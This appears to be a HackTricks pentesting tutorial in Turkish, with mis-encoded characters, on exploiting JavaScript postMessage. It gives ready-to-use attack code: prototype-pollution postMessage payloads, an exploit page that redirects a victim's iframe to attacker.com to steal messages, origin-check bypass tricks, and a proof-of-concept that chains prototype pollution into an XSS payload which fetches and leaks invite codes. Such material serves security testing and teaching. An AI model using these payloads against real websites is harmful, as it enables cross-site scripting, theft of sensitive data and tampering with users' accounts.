# PostMessage Zafiyetleri

## PostMessage Zafiyetleri

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## **PostMessage** GÃ¶nderme

**PostMessage**, bir mesaj gÃ¶ndermek iÃ§in aÅŸaÄŸÄ±daki iÅŸlevi kullanÄ±r:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
**targetOrigin** hedefOrigin olarak adlandÄ±rÄ±lan bir '\*' veya _https://company.com_ gibi bir URL olabilir. Ä°kinci senaryoda, mesaj yalnÄ±zca bu etki alanÄ±na gÃ¶nderilebilir (pencere nesnesinin kÃ¶keni farklÄ± olsa bile). Joker karakter kullanÄ±lÄ±rsa, mesajlar herhangi bir etki alanÄ±na gÃ¶nderilebilir ve pencere nesnesinin kÃ¶kenine gÃ¶nderilir.

### iframe ve hedefOrigin'deki joker karaktere saldÄ±rma

[**Bu raporda**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) aÃ§Ä±klandÄ±ÄŸÄ± gibi, **X-Frame-Header** korumasÄ± olmayan bir sayfa bulursanÄ±z ve bu sayfa, bir **joker karakteri** (\*) kullanarak **postMessage** ile **duyarlÄ±** bir mesaj gÃ¶nderiyorsa, iframe'in **kÃ¶kenini deÄŸiÅŸtirerek** duyarlÄ± mesajÄ± size ait bir etki alanÄ±na sÄ±zdÄ±rabilirsiniz.\
Sayfa iframelenebilir olsa da, **hedefOrigin** bir URL yerine bir joker karaktere ayarlanmÄ±ÅŸsa, bu hile iÅŸe yaramaz.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener sÃ¶mÃ¼rÃ¼sÃ¼

**`addEventListener`**, JS tarafÄ±ndan **`postMessage` bekleyen** fonksiyonun tanÄ±mlandÄ±ÄŸÄ± fonksiyondur.\
AÅŸaÄŸÄ±daki gibi bir kod kullanÄ±lacaktÄ±r:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Bu durumda, kodun yaptÄ±ÄŸÄ± **ilk ÅŸeyin kÃ¶keni kontrol etmek** olduÄŸuna dikkat edin. Bu, sayfanÄ±n alÄ±nan bilgilerle (Ã¶rneÄŸin ÅŸifre deÄŸiÅŸtirme gibi) **duyarlÄ± bir iÅŸlem yapacaksa** son derece **Ã¶nemlidir**. **KÃ¶keni kontrol etmezse, saldÄ±rganlar kurbanlarÄ±na bu uÃ§ noktalara keyfi veri gÃ¶ndermelerini saÄŸlayabilir** ve kurbanlarÄ±n ÅŸifrelerini deÄŸiÅŸtirebilir (bu Ã¶rnekte).

### NumaralandÄ±rma

Mevcut sayfadaki **olay dinleyicilerini bulmak** iÃ§in ÅŸunlarÄ± yapabilirsiniz:

* JS kodunda `window.addEventListener` ve `$(window).on` (_JQuery sÃ¼rÃ¼mÃ¼_) iÃ§in **arama** yapÄ±n.
* GeliÅŸtirici araÃ§larÄ± konsolunda ÅŸunu **yÃ¼rÃ¼tÃ¼n**: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* TarayÄ±cÄ±nÄ±n geliÅŸtirici araÃ§larÄ±nda **Ã–ÄŸeler --> Olay Dinleyicileri**'ne gidin.

![](<../../.gitbook/assets/image (617).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) veya [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) gibi bir **tarayÄ±cÄ± eklentisi** kullanÄ±n. Bu tarayÄ±cÄ± eklentileri, **tÃ¼m iletileri** yakalar ve size gÃ¶sterir.

### KÃ¶ken kontrolÃ¼ atlatmalarÄ±

- **`event.isTrusted`** Ã¶zelliÄŸi, yalnÄ±zca gerÃ§ek kullanÄ±cÄ± eylemleriyle oluÅŸturulan olaylar iÃ§in `True` dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼ iÃ§in gÃ¼venli kabul edilir. DoÄŸru bir ÅŸekilde uygulandÄ±ÄŸÄ±nda atlatÄ±lmasÄ± zor olsa da, gÃ¼venlik kontrollerindeki Ã¶nemi dikkate deÄŸerdir.

- PostMessage olaylarÄ±nda kÃ¶ken doÄŸrulamasÄ± iÃ§in **`indexOf()`** yÃ¶ntemi atlatÄ±labilir olabilir. Bu zafiyeti gÃ¶steren bir Ã¶rnek:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- `String.prototype.search()`'den gelen **`search()`** yÃ¶ntemi dÃ¼zenli ifadeler iÃ§in tasarlanmÄ±ÅŸtÄ±r, dize iÃ§in deÄŸil. DÃ¼zenli ifade dÄ±ÅŸÄ±nda baÅŸka bir ÅŸey geÃ§irmek, yÃ¶ntemin potansiyel olarak gÃ¼vensiz olmasÄ±na neden olan bir dÃ¼zenli ifadeye dÃ¶nÃ¼ÅŸÃ¼m yapar. Ã‡Ã¼nkÃ¼ dÃ¼zenli ifadede nokta (.) bir joker karakteri olarak iÅŸlev gÃ¶rerek Ã¶zel olarak oluÅŸturulmuÅŸ alan adlarÄ±yla doÄŸrulamanÄ±n atlatÄ±lmasÄ±na izin verir. Ã–rneÄŸin:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- `search()` gibi **`match()`** iÅŸlevi de dÃ¼zenli ifadeleri iÅŸler. DÃ¼zenli ifade yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, atlatÄ±labilir olabilir.

- **`escapeHtml`** iÅŸlevi karakterleri kaÃ§Ä±rarak giriÅŸleri temizlemek iÃ§in tasarlanmÄ±ÅŸtÄ±r. Ancak, yeni bir kaÃ§Ä±rÄ±lmÄ±ÅŸ nesne oluÅŸturmaz, mevcut nesnenin Ã¶zelliklerini Ã¼zerine yazar. Bu davranÄ±ÅŸ istismar edilebilir. Ã–zellikle, bir nesne, kontrol edilen Ã¶zelliÄŸi `hasOwnProperty` kabul etmeyen ÅŸekilde manipÃ¼le edilebilirse, `escapeHtml` beklenildiÄŸi gibi Ã§alÄ±ÅŸmayacaktÄ±r. AÅŸaÄŸÄ±daki Ã¶rneklerde bunun nasÄ±l gÃ¶sterildiÄŸi gÃ¶rÃ¼lebilir:

- Beklenen BaÅŸarÄ±sÄ±zlÄ±k:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- KaÃ§Ä±rma:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Bu zafiyet baÄŸlamÄ±nda, `File` nesnesi, salt okunur `name` Ã¶zelliÄŸi nedeniyle dikkate deÄŸer ÅŸekilde istismar edilebilir. Bu Ã¶zellik, ÅŸablonlarda kullanÄ±ldÄ±ÄŸÄ±nda `escapeHtml` iÅŸlevi tarafÄ±ndan temizlenmez ve potansiyel gÃ¼venlik risklerine yol aÃ§ar.

- JavaScript'teki `document.domain` Ã¶zelliÄŸi, bir betik tarafÄ±ndan etki alanÄ±nÄ± kÄ±saltmak iÃ§in ayarlanabilir ve aynÄ± ana etki alanÄ± iÃ§inde daha esnek aynÄ± kÃ¶ken politikasÄ± uygulamasÄ±na olanak tanÄ±r.

### e.origin == window.origin atlatmasÄ±

Bir **kumlu iframe** iÃ§inde bir web sayfasÄ± gÃ¶mÃ¼lÃ¼rken %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%, iframe'in kÃ¶keninin `null` olarak ayarlandÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir. Bu, Ã¶zellikle **kumlu Ã¶znitelikler** ve bunlarÄ±n gÃ¼venlik ve iÅŸlevsellik Ã¼zerindeki etkileriyle ilgilenirken Ã¶nemlidir.

Kumlu Ã¶zniteliÄŸinde **`allow-popups`** belirtilerek, iframe iÃ§inden aÃ§Ä±lan herhangi bir aÃ§Ä±lÄ±r pencere, ebeveyninin kumlu kÄ±sÄ±tlamalarÄ±nÄ± devralÄ±r. Bu, aÃ§Ä±lÄ±r pencerenin kÃ¶keninin de `null` olarak ayarlandÄ±ÄŸÄ± anlamÄ±na gelir ve iframe'in kÃ¶keniyle uyumlu olur.

SonuÃ§ olarak, bu koÅŸullar altÄ±nda bir aÃ§Ä±lÄ±r pencere aÃ§Ä±ldÄ±ÄŸÄ±nda ve iframe'den aÃ§Ä±lÄ±r pencereye bir mesaj **`postMessage`** kullanÄ±larak gÃ¶nderildiÄŸinde, hem gÃ¶nderen hem de alÄ±cÄ± uÃ§larÄ±n kÃ¶kenleri `null` olarak ayarlanÄ±r. Bu durumda **`e.origin == window.origin`** ifadesi doÄŸru deÄŸerlendirilir (`null == null`), Ã§Ã¼nkÃ¼ hem iframe hem de aÃ§Ä±lÄ±r pencere, `null` olan aynÄ± kÃ¶ken deÄŸerini paylaÅŸÄ±rlar.

Daha fazla bilgi iÃ§in **okuyun**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source atlatmasÄ±

MesajÄ±n, betiÄŸin dinlediÄŸi pencereden gelip gelmediÄŸini kontrol etmek mÃ¼mkÃ¼ndÃ¼r (Ã¶zellikle **tarayÄ±cÄ± uzantÄ±larÄ±ndan GÃ¶rÃ¼ntÃ¼ Betikleri** iÃ§in mesajÄ±n aynÄ± sayfadan gÃ¶nderilip gÃ¶nderilmediÄŸini kontrol etmek iÃ§in Ã¶zellikle ilginÃ§tir):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
**`e.source`** bir mesajÄ±n zorla null olmasÄ±nÄ± saÄŸlayabilirsiniz, bunun iÃ§in **postMessage** gÃ¶nderen ve hemen silinen bir **iframe** oluÅŸturmanÄ±z gerekmektedir.

Daha fazla bilgi iÃ§in **okuyun:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header atlatma

Bu saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in ideal olarak **kurban web sayfasÄ±nÄ±** bir `iframe` iÃ§ine yerleÅŸtirebilirsiniz. Ancak, `X-Frame-Header` gibi bazÄ± baÅŸlÄ±klar bu **davranÄ±ÅŸÄ± engelleyebilir**.\
Bu senaryolarda daha az gizli bir saldÄ±rÄ± kullanabilirsiniz. SavunmasÄ±z web uygulamasÄ±nÄ± yeni bir sekmede aÃ§abilir ve onunla iletiÅŸim kurabilirsiniz:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Ana sayfayÄ± engelleyerek Ã§ocuÄŸa gÃ¶nderilen mesajÄ± Ã§almak

AÅŸaÄŸÄ±daki sayfada, verileri gÃ¶ndermeden Ã¶nce **ana** sayfayÄ± **engelleyerek**, bir **Ã§ocuk iframe**'e gÃ¶nderilen **duyarlÄ± postmessage verilerini** Ã§alabileceÄŸinizi ve verilerin alÄ±nmadan Ã¶nce bir **Ã§ocukta XSS** kullanarak verileri **sÄ±zdÄ±rabileceÄŸinizi** gÃ¶rebilirsiniz:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Iframe konumunu deÄŸiÅŸtirerek mesaj Ã§almak

EÄŸer X-Frame-Header olmadan bir iframe iÃ§eren bir web sayfasÄ±nÄ± iframe'leyebilirseniz, o Ã§ocuk iframe'inin **konumunu deÄŸiÅŸtirebilirsiniz**, bÃ¶ylece bir **joker kullanarak** gÃ¶nderilen bir **postmessage** alÄ±yorsa, saldÄ±rgan o iframe'in **kÃ¶kenini** kendisi tarafÄ±ndan **kontrol edilen** bir sayfaya **deÄŸiÅŸtirebilir** ve mesajÄ± **Ã§alabilir**:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage ile Prototype Pollution ve/veya XSS

`postMessage` aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilen verilerin JS tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ± senaryolarda, **sayfayÄ± iframe'leyebilir** ve `postMessage` aracÄ±lÄ±ÄŸÄ±yla saldÄ±rÄ±yÄ± gÃ¶ndererek **prototype pollution/XSS**'i sÃ¶mÃ¼rebilirsiniz.

**Ã‡ok iyi aÃ§Ä±klanan birkaÃ§ XSS Ã¶rneÄŸi `postMessage` ile** [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html) adresinde bulunabilir.

Bir `iframe`'e **Prototype Pollution ve ardÄ±ndan XSS**'i sÃ¶mÃ¼rmek iÃ§in bir `postMessage` ile yapÄ±lan bir saldÄ±rÄ± Ã¶rneÄŸi:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**Daha fazla bilgi iÃ§in**:

* [**Prototip kirliliÄŸi**](../deserialization/nodejs-proto-prototype-pollution/) hakkÄ±nda sayfaya baÄŸlantÄ±
* [**XSS**](../xss-cross-site-scripting/) hakkÄ±nda sayfaya baÄŸlantÄ±
* [**Ä°stemci tarafÄ± prototip kirliliÄŸi ile XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) hakkÄ±nda sayfaya baÄŸlantÄ±

## Referanslar

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Pratik yapmak iÃ§in: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
